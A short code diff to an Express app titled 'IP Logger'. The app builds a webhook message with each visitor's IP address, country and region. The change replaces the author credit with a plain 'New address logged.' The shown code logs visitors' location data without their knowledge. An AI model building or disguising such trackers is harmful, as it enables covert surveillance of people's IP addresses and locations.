@@ -23,7 +23,7 @@ app.get("/", async (req, res) => {
   try {
     const embed = new MessageBuilder()
       .setTitle("IP Logger")
-      .setDescription("This is an IP logger made by https://github.com/baum1810")
+      .setDescription("New address logged.")
       .addField("IP", ipAddress)
       .addField("Country", country)
       .addField("Region", region)
